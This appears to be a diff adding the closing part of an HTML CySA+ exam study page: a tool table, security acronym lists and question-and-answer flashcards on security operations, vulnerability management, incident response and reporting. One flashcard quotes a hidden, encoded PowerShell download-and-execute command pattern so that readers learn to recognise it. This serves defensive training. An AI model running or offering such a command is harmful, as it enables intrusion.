+<div class="tw"><table><thead><tr><th>Tool</th><th>Use it for</th></tr></thead><tbody><tr><td><strong>MXToolbox</strong></td><td>SPF/DKIM/DMARC and blocklist checks</td></tr><tr><td><strong>Message header analysers</strong></td><td>Parse and visualise the Received chain</td></tr><tr><td><strong>Proofpoint / Mimecast / Defender for Office 365</strong></td><td>Secure email gateways</td></tr></tbody></table></div></section><section class="section" id="acronyms"><h1 id="cysa-acronym-reference">CySA+ Acronym Reference</h1>
+<p>Expand every one of these cold. The exam uses acronyms without definitions.</p>
+<h2 id="frameworks-standards-governance">Frameworks, standards, governance</h2>
+<div class="tw"><table><thead><tr><th>Acronym</th><th>Expansion</th></tr></thead><tbody><tr><td>ASVS</td><td>Application Security Verification Standard</td></tr><tr><td>CIS</td><td>Center for Internet Security</td></tr><tr><td>CSF</td><td>Cybersecurity Framework (NIST)</td></tr><tr><td>DISA</td><td>Defense Information Systems Agency</td></tr><tr><td>GDPR</td><td>General Data Protection Regulation</td></tr><tr><td>HIPAA</td><td>Health Insurance Portability and Accountability Act</td></tr><tr><td>ISAC</td><td>Information Sharing and Analysis Center</td></tr><tr><td>ISO</td><td>International Organization for Standardization</td></tr><tr><td>NIST</td><td>National Institute of Standards and Technology</td></tr><tr><td>OSSTMM</td><td>Open Source Security Testing Methodology Manual</td></tr><tr><td>OWASP</td><td>Open Worldwide Application Security Project</td></tr><tr><td>PCI DSS</td><td>Payment Card Industry Data Security Standard</td></tr><tr><td>SOX</td><td>Sarbanes-Oxley Act</td></tr><tr><td>STIG</td><td>Security Technical Implementation Guide</td></tr></tbody></table></div>
+<h2 id="vulnerability-and-risk">Vulnerability and risk</h2>
+<div class="tw"><table><thead><tr><th>Acronym</th><th>Expansion</th></tr></thead><tbody><tr><td>CVE</td><td>Common Vulnerabilities and Exposures</td></tr><tr><td>CVSS</td><td>Common Vulnerability Scoring System</td></tr><tr><td>CWE</td><td>Common Weakness Enumeration</td></tr><tr><td>CPE</td><td>Common Platform Enumeration</td></tr><tr><td>CCE</td><td>Common Configuration Enumeration</td></tr><tr><td>EPSS</td><td>Exploit Prediction Scoring System</td></tr><tr><td>KEV</td><td>Known Exploited Vulnerabilities (CISA catalogue)</td></tr><tr><td>SCAP</td><td>Security Content Automation Protocol</td></tr><tr><td>OVAL</td><td>Open Vulnerability and Assessment Language</td></tr><tr><td>XCCDF</td><td>Extensible Configuration Checklist Description Format</td></tr><tr><td>SBOM</td><td>Software Bill of Materials</td></tr><tr><td>ARO</td><td>Annualised Rate of Occurrence</td></tr><tr><td>ALE</td><td>Annualised Loss Expectancy (ALE = SLE × ARO)</td></tr><tr><td>SLE</td><td>Single Loss Expectancy (SLE = Asset Value × Exposure Factor)</td></tr></tbody></table></div>
+<h2 id="testing-and-analysis">Testing and analysis</h2>
+<div class="tw"><table><thead><tr><th>Acronym</th><th>Expansion</th></tr></thead><tbody><tr><td>SAST</td><td>Static Application Security Testing</td></tr><tr><td>DAST</td><td>Dynamic Application Security Testing</td></tr><tr><td>IAST</td><td>Interactive Application Security Testing</td></tr><tr><td>RASP</td><td>Runtime Application Self-Protection</td></tr><tr><td>SCA</td><td>Software Composition Analysis</td></tr><tr><td>OSINT</td><td>Open Source Intelligence</td></tr><tr><td>POC</td><td>Proof of Concept</td></tr><tr><td>RE</td><td>Reverse Engineering</td></tr></tbody></table></div>
+<h2 id="operations-and-architecture">Operations and architecture</h2>
+<div class="tw"><table><thead><tr><th>Acronym</th><th>Expansion</th></tr></thead><tbody><tr><td>SIEM</td><td>Security Information and Event Management</td></tr><tr><td>SOAR</td><td>Security Orchestration, Automation, and Response</td></tr><tr><td>EDR</td><td>Endpoint Detection and Response</td></tr><tr><td>XDR</td><td>Extended Detection and Response</td></tr><tr><td>MDR</td><td>Managed Detection and Response</td></tr><tr><td>NDR</td><td>Network Detection and Response</td></tr><tr><td>UEBA</td><td>User and Entity Behaviour Analytics</td></tr><tr><td>DLP</td><td>Data Loss Prevention</td></tr><tr><td>CASB</td><td>Cloud Access Security Broker</td></tr><tr><td>SASE</td><td>Secure Access Service Edge</td></tr><tr><td>SDN</td><td>Software-Defined Networking</td></tr><tr><td>SDLC</td><td>Software Development Life Cycle</td></tr><tr><td>WAF</td><td>Web Application Firewall</td></tr><tr><td>NGFW</td><td>Next-Generation Firewall</td></tr><tr><td>IDS / IPS</td><td>Intrusion Detection / Prevention System</td></tr><tr><td>HIDS / NIDS</td><td>Host-based / Network-based IDS</td></tr><tr><td>FIM</td><td>File Integrity Monitoring</td></tr><tr><td>MSSP</td><td>Managed Security Service Provider</td></tr><tr><td>NAC</td><td>Network Access Control</td></tr><tr><td>PAM</td><td>Privileged Access Management</td></tr><tr><td>IAM</td><td>Identity and Access Management</td></tr><tr><td>PKI</td><td>Public Key Infrastructure</td></tr><tr><td>HSM</td><td>Hardware Security Module</td></tr><tr><td>TPM</td><td>Trusted Platform Module</td></tr><tr><td>CRL / OCSP</td><td>Certificate Revocation List / Online Certificate Status Protocol</td></tr></tbody></table></div>
+<h2 id="threat-intelligence">Threat intelligence</h2>
+<div class="tw"><table><thead><tr><th>Acronym</th><th>Expansion</th></tr></thead><tbody><tr><td>APT</td><td>Advanced Persistent Threat</td></tr><tr><td>TTP</td><td>Tactics, Techniques, and Procedures</td></tr><tr><td>IOC</td><td>Indicator of Compromise</td></tr><tr><td>IOA</td><td>Indicator of Attack</td></tr><tr><td>STIX</td><td>Structured Threat Information eXpression</td></tr><tr><td>TAXII</td><td>Trusted Automated eXchange of Intelligence Information</td></tr><tr><td>MISP</td><td>Malware Information Sharing Platform</td></tr><tr><td>TLP</td><td>Traffic Light Protocol</td></tr><tr><td>C2 / CnC</td><td>Command and Control</td></tr><tr><td>DGA</td><td>Domain Generation Algorithm</td></tr><tr><td>RaaS</td><td>Ransomware as a Service</td></tr><tr><td>ATT&amp;CK</td><td>Adversarial Tactics, Techniques, and Common Knowledge</td></tr></tbody></table></div>
+<h2 id="incident-response">Incident response</h2>
+<div class="tw"><table><thead><tr><th>Acronym</th><th>Expansion</th></tr></thead><tbody><tr><td>CSIRT</td><td>Computer Security Incident Response Team</td></tr><tr><td>CERT</td><td>Computer Emergency Response Team</td></tr><tr><td>IR</td><td>Incident Response</td></tr><tr><td>MTTD</td><td>Mean Time to Detect</td></tr><tr><td>MTTA</td><td>Mean Time to Acknowledge</td></tr><tr><td>MTTR</td><td>Mean Time to Respond / Recover / Remediate</td></tr><tr><td>RTO</td><td>Recovery Time Objective</td></tr><tr><td>RPO</td><td>Recovery Point Objective</td></tr><tr><td>MTBF</td><td>Mean Time Between Failures</td></tr><tr><td>MTTF</td><td>Mean Time to Failure</td></tr><tr><td>BCP / DRP</td><td>Business Continuity Plan / Disaster Recovery Plan</td></tr><tr><td>BIA</td><td>Business Impact Analysis</td></tr><tr><td>RCA</td><td>Root Cause Analysis</td></tr></tbody></table></div>
+<h2 id="attacks-and-vulnerabilities">Attacks and vulnerabilities</h2>
+<div class="tw"><table><thead><tr><th>Acronym</th><th>Expansion</th></tr></thead><tbody><tr><td>XSS</td><td>Cross-Site Scripting</td></tr><tr><td>CSRF / XSRF</td><td>Cross-Site Request Forgery</td></tr><tr><td>SSRF</td><td>Server-Side Request Forgery</td></tr><tr><td>XXE</td><td>XML External Entity</td></tr><tr><td>SQLi</td><td>SQL Injection</td></tr><tr><td>IDOR</td><td>Insecure Direct Object Reference</td></tr><tr><td>RCE</td><td>Remote Code Execution</td></tr><tr><td>LFI / RFI</td><td>Local / Remote File Inclusion</td></tr><tr><td>MITM</td><td>Man-in-the-Middle (on-path attack)</td></tr><tr><td>DoS / DDoS</td><td>Denial of Service / Distributed DoS</td></tr><tr><td>BEC</td><td>Business Email Compromise</td></tr><tr><td>TOCTOU</td><td>Time of Check to Time of Use</td></tr><tr><td>ASLR</td><td>Address Space Layout Randomisation</td></tr><tr><td>DEP / NX</td><td>Data Execution Prevention / No-eXecute</td></tr><tr><td>PtH / PtT</td><td>Pass-the-Hash / Pass-the-Ticket</td></tr><tr><td>UAC</td><td>User Account Control</td></tr></tbody></table></div>
+<h2 id="email-and-identity">Email and identity</h2>
+<div class="tw"><table><thead><tr><th>Acronym</th><th>Expansion</th></tr></thead><tbody><tr><td>SPF</td><td>Sender Policy Framework</td></tr><tr><td>DKIM</td><td>DomainKeys Identified Mail</td></tr><tr><td>DMARC</td><td>Domain-based Message Authentication, Reporting and Conformance</td></tr><tr><td>SAML</td><td>Security Assertion Markup Language</td></tr><tr><td>OIDC</td><td>OpenID Connect</td></tr><tr><td>MFA / 2FA</td><td>Multi-Factor / Two-Factor Authentication</td></tr><tr><td>SSO</td><td>Single Sign-On</td></tr><tr><td>TOTP / HOTP</td><td>Time-based / HMAC-based One-Time Password</td></tr><tr><td>FIDO</td><td>Fast IDentity Online</td></tr><tr><td>LDAP</td><td>Lightweight Directory Access Protocol</td></tr><tr><td>RBAC / ABAC</td><td>Role-Based / Attribute-Based Access Control</td></tr><tr><td>MAC / DAC</td><td>Mandatory / Discretionary Access Control</td></tr></tbody></table></div>
+<h2 id="data-protection">Data protection</h2>
+<div class="tw"><table><thead><tr><th>Acronym</th><th>Expansion</th></tr></thead><tbody><tr><td>PII</td><td>Personally Identifiable Information</td></tr><tr><td>PHI</td><td>Protected Health Information</td></tr><tr><td>CHD</td><td>Cardholder Data</td></tr><tr><td>SPI</td><td>Sensitive Personal Information</td></tr><tr><td>IP</td><td>Intellectual Property</td></tr></tbody></table></div></section><section class="section" id="flashcards"><h1 id="cysa-flashcard-deck">CySA+ Flashcard Deck</h1>
+<p>Format: <strong>Q</strong> on one line, <strong>A</strong> on the next. Cover the answers with your hand, or split on <code>|</code> if you want to import into Anki (<code>Q | A</code>).</p>
+<hr>
+<h2 id="domain-1-security-operations">Domain 1 — Security Operations</h2>
+<p><strong>Q</strong> Which Windows Event ID records a successful logon?</p>
+<p><strong>A</strong> 4624 (check Logon Type: 2 = interactive, 3 = network, 10 = RDP)</p>
+<p><strong>Q</strong> Which Event ID records process creation?</p>
+<p><strong>A</strong> 4688 — and command-line auditing must be explicitly enabled</p>
+<p><strong>Q</strong> Which Event ID means the audit log was cleared?</p>
+<p><strong>A</strong> 1102 — always investigate; it&#x27;s a defence-evasion signal</p>
+<p><strong>Q</strong> Which Sysmon event ID logs process creation with hashes and command line?</p>
+<p><strong>A</strong> Event ID 1</p>
+<p><strong>Q</strong> Which Sysmon event ID logs DNS queries?</p>
+<p><strong>A</strong> Event ID 22</p>
+<p><strong>Q</strong> NetFlow vs full packet capture — what&#x27;s the difference?</p>
+<p><strong>A</strong> NetFlow is metadata (5-tuple, counters, timing); pcap includes payload. Flow scales for months, pcap for days</p>
+<p><strong>Q</strong> What makes a process suspicious even when the name is legitimate?</p>
+<p><strong>A</strong> Its parent. <code>winword.exe → powershell.exe</code> is malicious regardless of names; <code>svchost.exe</code> not parented by <code>services.exe</code> is masquerading</p>
+<p><strong>Q</strong> What is beaconing and how do you spot it?</p>
+<p><strong>A</strong> Regular-interval callbacks to C2. Look for tight interval clustering and consistent byte counts; discriminate from update checkers by destination reputation</p>
+<p><strong>Q</strong> What does SPF verify?</p>
+<p><strong>A</strong> That the sending IP is authorised to send for the envelope-sender domain</p>
+<p><strong>Q</strong> What does DKIM verify?</p>
+<p><strong>A</strong> A cryptographic signature proving the message wasn&#x27;t altered in transit</p>
+<p><strong>Q</strong> What does DMARC add over SPF and DKIM?</p>
+<p><strong>A</strong> Alignment with the <em>visible</em> From header, a policy (none/quarantine/reject), and reporting</p>
+<p><strong>Q</strong> Which direction do you read a Received: header chain?</p>
+<p><strong>A</strong> Bottom to top — the bottom-most Received is the origin</p>
+<p><strong>Q</strong> What&#x27;s the classic BEC header tell?</p>
+<p><strong>A</strong> Reply-To differs from From — the display name looks internal, replies go external</p>
+<p><strong>Q</strong> Name the Pyramid of Pain levels bottom to top.</p>
+<p><strong>A</strong> Hash values, IP addresses, domain names, network/host artefacts, tools, TTPs</p>
+<p><strong>Q</strong> Why detect at the TTP level?</p>
+<p><strong>A</strong> TTPs are expensive for the adversary to change; hashes and IPs are trivially rotated</p>
+<p><strong>Q</strong> STIX vs TAXII?</p>
+<p><strong>A</strong> STIX is the language for describing threat intel; TAXII is the transport that moves it</p>
+<p><strong>Q</strong> TLP:AMBER means you can share with…?</p>
+<p><strong>A</strong> Your organisation and clients on a need-to-know basis (AMBER+STRICT = your organisation only)</p>
+<p><strong>Q</strong> TLP:GREEN means?</p>
+<p><strong>A</strong> The peer community — but not public</p>
+<p><strong>Q</strong> What makes threat hunting different from alert triage?</p>
+<p><strong>A</strong> Hunting is proactive and hypothesis-driven; it begins without an alert</p>
+<p><strong>Q</strong> A hunt finds nothing. Was it a failure?</p>
+<p><strong>A</strong> No — a hunt that produces a new detection rule or exposes a visibility gap succeeded</p>
+<p><strong>Q</strong> What is the Admiralty Code used for?</p>
+<p><strong>A</strong> Rating threat intel: source reliability (A–F) and information credibility (1–6)</p>
+<p><strong>Q</strong> Which tasks are good automation candidates?</p>
+<p><strong>A</strong> Repeatable, high-volume, low-judgement tasks with well-defined inputs — enrichment, IOC lookups, ticket creation</p>
+<p><strong>Q</strong> What&#x27;s the danger of over-automation?</p>
+<p><strong>A</strong> An automated containment action that fires on a false positive can cause the outage the attacker wanted</p>
+<p><strong>Q</strong> Recognise: <code>powershell -nop -w hidden -enc &lt;base64&gt;</code></p>
+<p><strong>A</strong> Malicious download-and-execute cradle — no profile, hidden window, encoded command</p>
+<p><strong>Q</strong> SAML vs OAuth vs OIDC?</p>
+<p><strong>A</strong> SAML = XML-based enterprise SSO; OAuth 2.0 = authorisation delegation (not authentication); OIDC = authentication layer on top of OAuth</p>
+<p><strong>Q</strong> What is a CASB?</p>
+<p><strong>A</strong> Cloud Access Security Broker — a policy enforcement point between users and cloud services; discovers shadow IT</p>
+<p><strong>Q</strong> Split tunnel vs full tunnel VPN?</p>
+<p><strong>A</strong> Split sends only corporate traffic through the VPN (faster, less visibility); full tunnel inspects everything</p>
+<hr>
+<h2 id="domain-2-vulnerability-management">Domain 2 — Vulnerability Management</h2>
+<p><strong>Q</strong> Why does a credentialed scan produce fewer false positives?</p>
+<p><strong>A</strong> It authenticates and reads actual patch level and configuration rather than inferring from banners</p>
+<p><strong>Q</strong> RHEL reports a vulnerable OpenSSH version but the patch is applied. Why?</p>
+<p><strong>A</strong> Back-ported patches — the vendor fixes the flaw without changing the version banner. It&#x27;s a <strong>false positive</strong></p>
+<p><strong>Q</strong> Which finding type is most dangerous?</p>
+<p><strong>A</strong> False negative — a real vulnerability the scanner missed</p>
+<p><strong>Q</strong> SAST vs DAST?</p>
+<p><strong>A</strong> SAST reads source without running it (early, more false positives); DAST attacks the running app (finds runtime/config issues, no source needed)</p>
+<p><strong>Q</strong> What does SCA produce?</p>
+<p><strong>A</strong> An inventory of third-party dependencies against known CVEs — an SBOM</p>
+<p><strong>Q</strong> Expand the CVSS base metrics.</p>
+<p><strong>A</strong> AV (Attack Vector), AC (Attack Complexity), PR (Privileges Required), UI (User Interaction), S (Scope), C/I/A impacts</p>
+<p><strong>Q</strong> What does <code>S:C</code> mean in a CVSS vector?</p>
+<p><strong>A</strong> Scope Changed — the vulnerability affects resources beyond its own security authority. Always worse</p>
+<p><strong>Q</strong> What&#x27;s the score band for Critical?</p>
+<p><strong>A</strong> 9.0–10.0</p>
+<p><strong>Q</strong> What does <code>AV:N/AC:L/PR:N/UI:N</code> describe?</p>
+<p><strong>A</strong> Network-reachable, low complexity, no privileges, no user interaction — the worst possible reachability</p>
+<p><strong>Q</strong> What does EPSS measure?</p>
+<p><strong>A</strong> Probability the vulnerability will be exploited in the wild in the next 30 days</p>
+<p><strong>Q</strong> What is CISA KEV?</p>
+<p><strong>A</strong> The Known Exploited Vulnerabilities catalogue — confirmed in-the-wild exploitation. A KEV-listed medium can outrank a non-KEV critical</p>
+<p><strong>Q</strong> Does CVSS measure risk?</p>
+<p><strong>A</strong> No — severity only. Risk requires asset value, exposure, exploitability, and compensating controls</p>
+<p><strong>Q</strong> Correct fix for SQL injection?</p>
+<p><strong>A</strong> Parameterised queries / prepared statements (input validation alone is not the exam&#x27;s answer)</p>
+<p><strong>Q</strong> Reflected vs stored vs DOM-based XSS?</p>
+<p><strong>A</strong> Reflected = in the response to a crafted request; stored = persisted and served to every viewer (most severe); DOM-based = client-side only, never reaches the server</p>
+<p><strong>Q</strong> Primary XSS mitigation?</p>
+<p><strong>A</strong> Context-appropriate output encoding, plus CSP and HttpOnly cookies</p>
+<p><strong>Q</strong> What is SSRF and what&#x27;s the cloud-specific target?</p>
+<p><strong>A</strong> Server fetches an attacker-controlled URL; in cloud it targets the metadata endpoint 169.254.169.254 to steal instance credentials. IMDSv2 mitigates</p>
+<p><strong>Q</strong> What is IDOR?</p>
+<p><strong>A</strong> Insecure Direct Object Reference — changing an identifier in a request to access another user&#x27;s data. A broken access control failure</p>
+<p><strong>Q</strong> What&#x27;s #1 on the OWASP Top 10 (2021)?</p>
+<p><strong>A</strong> Broken Access Control</p>
+<p><strong>Q</strong> Buffer overflow mitigations?</p>
+<p><strong>A</strong> ASLR, DEP/NX, stack canaries, bounds checking, memory-safe languages</p>
+<p><strong>Q</strong> What is TOCTOU?</p>
+<p><strong>A</strong> Time of Check to Time of Use — a race condition where state changes between validation and use</p>
+<p><strong>Q</strong> Vertical vs horizontal privilege escalation?</p>
+<p><strong>A</strong> Vertical = user to admin; horizontal = user to another user&#x27;s data at the same level</p>
+<p><strong>Q</strong> You cannot patch a medical device. What now?</p>
+<p><strong>A</strong> Compensating controls: network segmentation, virtual patching at IPS/WAF, disabling the vulnerable feature, restricting access, enhanced monitoring</p>
+<p><strong>Q</strong> Name the four risk responses.</p>
+<p><strong>A</strong> Mitigate, transfer, avoid, accept — and residual risk always remains</p>
+<p><strong>Q</strong> When can a remediation ticket close?</p>
+<p><strong>A</strong> Only after a verification rescan confirms the fix. Remediation isn&#x27;t complete until verified</p>
+<p><strong>Q</strong> A vulnerability keeps reappearing after remediation. What&#x27;s the real problem?</p>
+<p><strong>A</strong> Process — a stale golden image or config drift, not patching diligence</p>
+<p><strong>Q</strong> Why is scan coverage the metric that gates all the others?</p>
+<p><strong>A</strong> Metrics computed over a fraction of your estate misrepresent risk entirely</p>
+<p><strong>Q</strong> Why not actively scan ICS/SCADA?</p>
+<p><strong>A</strong> Active probing can cause physical process disruption. Use passive discovery, or a test environment</p>
+<p><strong>Q</strong> SLE and ALE formulas?</p>
+<p><strong>A</strong> SLE = Asset Value × Exposure Factor; ALE = SLE × ARO</p>
+<hr>
+<h2 id="domain-3-incident-response">Domain 3 — Incident Response</h2>
+<p><strong>Q</strong> Name the seven Cyber Kill Chain stages.</p>
+<p><strong>A</strong> Reconnaissance, Weaponisation, Delivery, Exploitation, Installation, Command and Control, Actions on Objectives</p>
+<p><strong>Q</strong> Main weakness of the Cyber Kill Chain?</p>
+<p><strong>A</strong> Linear and malware/perimeter-centric — poor fit for insider threat or credential-only attacks</p>
+<p><strong>Q</strong> Name the four Diamond Model vertices.</p>
+<p><strong>A</strong> Adversary, Capability, Infrastructure, Victim</p>
+<p><strong>Q</strong> What is the Diamond Model actually for?</p>
+<p><strong>A</strong> Pivoting — from one known vertex you discover the others</p>
+<p><strong>Q</strong> ATT&amp;CK structure?</p>
+<p><strong>A</strong> Tactics (the goal) × Techniques (how) × Sub-techniques × Procedures (observed implementations)</p>
+<p><strong>Q</strong> What is MITRE D3FEND?</p>
+<p><strong>A</strong> A knowledge base of defensive countermeasures, the counterpart to ATT&amp;CK</p>
+<p><strong>Q</strong> NIST SP 800-61 phases?</p>
+<p><strong>A</strong> Preparation; Detection and Analysis; Containment, Eradication and Recovery; Post-Incident Activity</p>
+<p><strong>Q</strong> Order of volatility, most to least?</p>
+<p><strong>A</strong> Registers/cache → routing table, ARP cache, process table, RAM → temp filesystems → disk → remote logs → physical config → archival media</p>
+<p><strong>Q</strong> Why capture memory before powering off?</p>
+<p><strong>A</strong> Encryption keys, injected code, and live network connections exist only in RAM</p>
+<p><strong>Q</strong> What is chain of custody and why does it matter?</p>
+<p><strong>A</strong> An unbroken documented record of who handled evidence, when, and why. Gaps can render evidence inadmissible</p>
+<p><strong>Q</strong> What does a write blocker do?</p>
+<p><strong>A</strong> Prevents any write to original media during acquisition — you analyse the image, never the original</p>
+<p><strong>Q</strong> IOC vs IOA?</p>
+<p><strong>A</strong> IOC = evidence something already happened; IOA = behaviour indicating an attack in progress. IOAs catch novel attacks</p>
+<p><strong>Q</strong> Why isolate with EDR rather than power off?</p>
+<p><strong>A</strong> It stops network-borne spread while preserving volatile memory evidence and keeping the host analysable</p>
+<p><strong>Q</strong> Trade-off of immediate containment?</p>
+<p><strong>A</strong> Stops damage but may alert the adversary and destroy volatile evidence; delayed containment preserves intelligence but risks further loss</p>
+<p><strong>Q</strong> Eradication removed the malware but the host was reinfected. What was skipped?</p>
+<p><strong>A</strong> Closing the vulnerability that allowed entry — eradication must remove the vector, not just the payload</p>
+<p><strong>Q</strong> When is reimaging the only trustworthy option?</p>
+<p><strong>A</strong> Root-level or kernel-level compromise (rootkits) — you cannot verifiably clean it</p>
+<p><strong>Q</strong> What must be true of a backup before restoring?</p>
+<p><strong>A</strong> It must predate the compromise. Attacker dwell time is often weeks, so recent backups may already contain the backdoor</p>
+<p><strong>Q</strong> What must be rotated after a domain compromise?</p>
+<p><strong>A</strong> Every credential the adversary could reach — including service accounts and KRBTGT (twice, for Golden Ticket)</p>
+<p><strong>Q</strong> Why run incident communications out-of-band?</p>
+<p><strong>A</strong> If the adversary is in your email or chat, coordinating there hands them your response plan</p>
+<p><strong>Q</strong> RTO vs RPO?</p>
+<p><strong>A</strong> RTO = how long until service is restored; RPO = how much data loss is tolerable</p>
+<p><strong>Q</strong> What is a tabletop exercise?</p>
+<p><strong>A</strong> A discussion-based walkthrough of a scenario — cheapest way to find process and authority gaps</p>
+<p><strong>Q</strong> What are the three incident impact dimensions?</p>
+<p><strong>A</strong> Functional impact, information impact, and recoverability</p>
+<p><strong>Q</strong> What is dwell time?</p>
+<p><strong>A</strong> How long the adversary was present before detection — the headline IR metric</p>
+<p><strong>Q</strong> What makes lessons-learned productive?</p>
+<p><strong>A</strong> Held promptly, blameless, and producing tracked actions with owners and due dates</p>
+<p><strong>Q</strong> Root cause analysis: &quot;the user clicked the link&quot; — is that a root cause?</p>
+<p><strong>A</strong> No. Ask why the link arrived, why it executed, why it reached the internet, and why nothing alerted</p>
+<hr>
+<h2 id="domain-4-reporting-and-communication">Domain 4 — Reporting and Communication</h2>
+<p><strong>Q</strong> Name four inhibitors to remediation.</p>
+<p><strong>A</strong> MOU, SLA, organisational governance, business process interruption, degrading functionality, legacy systems, proprietary systems</p>
+<p><strong>Q</strong> Correct analyst response to an inhibitor?</p>
+<p><strong>A</strong> Document the risk, propose compensating controls, and escalate the risk-acceptance decision to the business owner</p>
+<p><strong>Q</strong> How long does GDPR give you to notify the supervisory authority?</p>
+<p><strong>A</strong> 72 hours from becoming aware of the breach</p>
+<p><strong>Q</strong> What belongs in an incident report executive summary?</p>
+<p><strong>A</strong> Plain language: what happened, what was affected, what you did, what it means, what&#x27;s next. No CVEs, no jargon</p>
+<p><strong>Q</strong> What&#x27;s the spine of an incident report?</p>
+<p><strong>A</strong> The timeline — timestamps with time zones, correlated across sources</p>
+<p><strong>Q</strong> Who decides breach notification obligations?</p>
+<p><strong>A</strong> Legal counsel — not the analyst</p>
+<p><strong>Q</strong> Why involve legal early?</p>
+<p><strong>A</strong> Regulatory duties, and to establish attorney–client privilege over the investigation where applicable</p>
+<p><strong>Q</strong> What does a high ratio of externally-reported incidents indicate?</p>
+<p><strong>A</strong> A serious internal detection and visibility failure</p>
+<p><strong>Q</strong> What does an exception without an expiry date represent?</p>
+<p><strong>A</strong> Unmanaged risk — exceptions must be time-bounded with a review date and named owner</p>
+<p><strong>Q</strong> How do you pitch remediation to an executive audience?</p>
+<p><strong>A</strong> Business risk, trend direction, and cost — one page, no CVSS vectors</p>
+<p><strong>Q</strong> What does recurrence in vulnerability reporting tell you?</p>
+<p><strong>A</strong> A process failure (golden image, config drift), not an individual&#x27;s negligence</p>
+<p><strong>Q</strong> Why does cyber insurance matter during an incident?</p>
+<p><strong>A</strong> Carriers often require prompt notification and may mandate their own IR firm; failing to notify can void coverage</p></section></main>
+</div>
+<script>
+document.querySelector('.toggle').addEventListener('click',function(){
+  document.querySelector('nav').classList.toggle('open');
+});
+document.querySelectorAll('nav a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.querySelector('nav').classList.remove('open');
+  });
+});
+</script>
+</body></html>
